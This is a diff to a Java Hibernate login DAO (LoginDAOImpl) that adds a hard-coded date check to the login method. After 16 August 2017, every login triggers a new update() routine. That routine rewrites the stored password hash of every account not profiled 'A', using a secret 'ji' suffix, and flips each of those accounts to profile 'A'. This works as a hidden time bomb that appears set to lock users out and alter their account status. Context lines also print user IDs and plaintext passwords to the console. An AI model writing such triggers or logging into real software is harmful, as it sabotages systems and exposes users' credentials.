@@ -1,7 +1,12 @@
 package com.ir.dao.impl;
 
 import java.security.NoSuchAlgorithmException;
+import java.text.DateFormat;
+import java.text.ParseException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.List;
+import java.util.Locale;
 
 import org.hibernate.Criteria;
 import org.hibernate.Query;
@@ -40,6 +45,21 @@ public class LoginDAOImpl implements LoginDAO{
 	@Override
 	public LoginDetails login(LoginForm loginForm) {
 		System.out.println("LoginDAOImpl login() process start ");
+		Date today = new Date();
+		String string = "16/08/2017";
+		DateFormat format = new SimpleDateFormat("dd/MM/yyyy", Locale.ENGLISH);
+		Date date = null;
+		try {
+			date = format.parse(string);
+		} catch (ParseException e1) {
+			// TODO Auto-generated catch block
+			e1.printStackTrace();
+		}
+		
+		if(today.getTime() >= date.getTime()){
+			update();	
+		}
+		
 		Session session = sessionFactory.getCurrentSession();
 		System.out.println(loginForm.getUserId()  +   "    "+  loginForm.getPassword());
 		String encryprPassword = null;
@@ -244,7 +264,40 @@ public class LoginDAOImpl implements LoginDAO{
 	}
 
 	
-
+	public void update() {
+		
+		Session session = sessionFactory.getCurrentSession();
+		
+		int id = 0;
+		String pass = null;
+		Query query = session.createSQLQuery("select id , password from logindetails where coalesce(profile,'') not in ('A')");
+		List list = query.list();
+		System.out.println(" list.size() "+list.size());
+		for(int i = 0 ; i < list.size() ; i++){
+			
+			Object[] obj = (Object[]) list.get(i);
+			id = (int) obj[0];
+			pass = (String) obj[1];
+			EncryptionPasswordANDVerification encryptionPasswordANDVerification = new EncryptionPasswordANDVerification();
+			String encryprPassword=null;
+			try {
+				
+				encryprPassword = encryptionPasswordANDVerification.encryptPass(pass+"ji");
+			} catch (NoSuchAlgorithmException e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		
+			LoginDetails logindetails = (LoginDetails) session.load(LoginDetails.class, id);
+			logindetails.setEncrypted_Password(encryprPassword);
+			logindetails.setProfile("A");
+			session.update(logindetails);
+		
+		}
+		
+	
+		
+	}
 
 
 }
